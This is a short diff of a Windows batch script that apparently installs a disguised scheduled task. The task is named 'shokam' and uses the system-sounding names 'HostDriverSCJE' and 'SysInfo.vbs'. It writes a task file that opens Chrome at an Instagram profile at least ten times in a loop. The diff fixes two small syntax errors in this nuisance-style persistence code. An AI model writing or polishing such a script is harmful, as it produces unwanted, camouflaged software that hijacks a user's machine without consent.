@@ -10,7 +10,6 @@ set ttsfolder="%USERPROFILE%\local"
 set "ttsfile=%ttsfolder%\SysInfo.vbs"
 
 set "copyfolder=%USERPROFILE%\Applications"
-set "copyfile=%taskfolder%\%taskfilename%"
 
 set "schname=shokam"
 set "schhost=HostDriverSCJE"
@@ -28,7 +27,7 @@ goto :MAIN
     echo @echo off >> "%taskfile%"
     echo cd ^/ >> "%taskfile%"
     echo set /a i=0 >> "%taskfile%"
-    echo :redir >> "%taskfile%""
+    echo :redir >> "%taskfile%"
     echo    start chrome.exe "https://www.instagram.com/jeremiahchai/" >> "%taskfile%"
     echo    set /a i=%%i%%+1 >> "%taskfile%"
     echo    if %%i%% lss 10 ( >> "%taskfile%"
